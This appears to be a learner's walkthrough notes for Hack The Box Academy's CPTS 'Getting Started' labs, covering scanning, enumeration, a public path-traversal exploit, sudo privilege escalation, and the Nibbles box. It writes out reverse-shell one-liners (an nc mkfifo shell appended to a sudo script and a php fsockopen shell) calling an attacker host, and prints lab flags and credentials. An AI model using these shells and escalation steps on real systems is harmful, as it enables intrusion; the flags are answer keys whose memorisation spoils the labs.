---
title: CPTS labs - 01 Getting Started
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 01 Getting Started

## [Getting Started](https://academy.hackthebox.com/module/details/77)

### Pentesting Basics

#### [Service scanning](https://academy.hackthebox.com/module/77/section/726)

**Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**

```
sudo nmap -sC -sV -p8080 $ip 
```

**Results**: Apache Tomcat


**Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**

```
sudo nmap -sC -sV $ip
```

**Results**: 2323


**List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.**

```
smbclient  /\/\10.129.125.178/\users -U bob
# password: Welcome1. Included in the path explanation

smb>dir
smb>cd flag
smb>get flag.txt
smb>quit
cat flag.txt
```

**Results**: dceece590f3284c3866305eb2473d099


#### [Web Enumeration](https://academy.hackthebox.com/module/77/section/728)

**Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

```
dirb http://94.237.55.246:55655/    
# From enumeration you can get to dirb http://94.237.55.246:55655/robots.txt
```

Go to http://94.237.55.246:55655/robots.txt and you will notice http://94.237.55.246:55655/admin-login-page.php

Visit it and, hardcoded in the site you will see:

```
                <!-- TODO: remove test credentials admin:password123 -->

```

Login into the app.

**Results**: HTB{w3b_3num3r4710n_r3v34l5_53cr375}There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:


#### [Public Exploits](https://academy.hackthebox.com/module/77/section/843)

Access to the web app at http://ip:36883

The title of the wordpress post is "Simple Backup Plugin 2.7.10", which is a well-known vulnerable plugin. 

```
searchsploit Simple Backup Plugin 2.7.10
```


```
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Simple Backup Plugin Python Exploit 2.7.10 - Path Traversa | php/webapps/51937.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


```
sudo cp /usr/share/exploitdb/exploits/php/webapps/51937.txt .
mv 51937.txt 51937.py
chmod +x 51937.py
python ./51937.py http://83.136.255.162:36883/ "/flag.txt" 4
#  target_url = sys.argv[1]
#  file_name = sys.argv[2]
#  depth = int(sys.argv[3])
```


**Results**: HTB{my_f1r57_h4ck}


#### [Privilege Escalation](https://academy.hackthebox.com/module/77/section/844)

**SSH to $ip with user "user1" and password "password1". SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

```
ssh user1@$ip -p 31459
# password1

sudo -l
# User user1 may run the following commands on
#        ng-644144-gettingstartedprivesc-udbk3-5969ffb656-cp248:
#    (user2 : user2) NOPASSWD: /bin/bash

# One way: 
echo #!/bin/bash > lala.sh
echo cat /home/user2/flag.txt >> lala.sh
chmod +x lala.sh
sudo -u user2  /bin/bash lala.sh

# Another
sudo -u user2 /bin/bash -i
```


**Results**:  HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}


**Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

Once you are user2, go to /root:

```
cd /root
ls -la
```


```
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root root  4096 Jun  3 19:21 ..
-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt

```

So we have read access in .ssh folder. We can access and copy the private key 

```
cd .ssh
cat id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
....
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----
```

In our attacker machine we save that id_rsa key in our folder

```
echo "the key" > id_rsa
```

And now we can login as root

```
ssh root@$ip -p 31459 -i id_rsa
```

And cat the flag:

```
cat /root/flag.txt 
```



**Results**:  HTB{pr1v1l363_35c4l4710n_2_r007}


### Attacking your first box

#### Nibbles - Enumeration

 **Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**


```
sudo nmap -sC -sV $ip
```

**Results**:  2.4.18


#### [Nibbles - Initial Foothold](https://academy.hackthebox.com/module/77/section/852)

**Gain a foothold on the target and submit the user.txt flag**

Enumerate resources


```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H "HOST: $ip$"

dirb http://$ip/nibbleblog/
```

There are a lot of directory listing enabled. And eventually we can browser to:
http://$ip/nibbleblog/content/private/users.xml

We can identify the user admin.

![admin user](img/htb-nibble_00.png)

We could also enumerate http://$ip/nibbleblog/admin.php

Login access is admin:nibbles.

Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image

Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ 

Set a netcat listener

```
nc -lnvp 1234
```

Click on the reverse shell "image.php" and we will get a reverse shell.

```
whoami
#nibbler

cat /home/nibbler/user.txt
```



**Results**:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148


#### [Nibbles - Privilege Escalation](https://academy.hackthebox.com/module/77/section/853)

Escalate privileges and submit the root.txt flag.

```
cd /home/nibbler
```


```
sudo -l
```

Results:

```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user.

```
unzip personal.zip
strings /home/nibbler/personal/stuff/monitor.sh
```


```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPattacker 8443 >/tmp/f' | tee -a monitor.sh
```

In the attacker machine, open a new netcat:

```
nc -lnvp 8443
```

Run monitor.sh with sudo

```
sudo ./monitor.sh
```

In the new netcat connection you are root.

```
cat /root/root.txt
```


**Results**: de5e5d6619862a8aa5b9b212314e0cdd


Alternative way: Metasploit 

```shell-session
exploit/multi/http/nibbleblog_file_upload
```


### [Knowledge Check](https://academy.hackthebox.com/module/77/section/859)

**Spawn the target, gain a foothold and submit the contents of the user.txt flag.**

```
sudo nmap -sC -sV $ip
```

Go to http://$ip/robots.txt

Go to http://$ip/admin

Enter admin:admin

Go to Edit Theme: http://$ip/admin/theme-edit.php

Add a pentesmonkey shell and set a netcat listener on port 1234

Add gettingstarte.htb to your hosts file

Open the blog and you will get a reverse shell

```
cat /home/mrb3n/user.txt
```

**Results**: 7002d65b149b0a4d19132a66feed21d8


**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**

Check out our permissions

```
sudo -l
```

Results:

```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```

Grab a simple php reverse shell such as:

```
php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");'
```

Set up a netcat listener on port 4444:

```
nc -lnvp
```


Run as sudo:

```
sudo /usr/bin/php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");
```

You are root in the listener. Now

```
cat /root/root.txt
```

**Results**: f1fba6e9f71efb2630e6e34da6387842

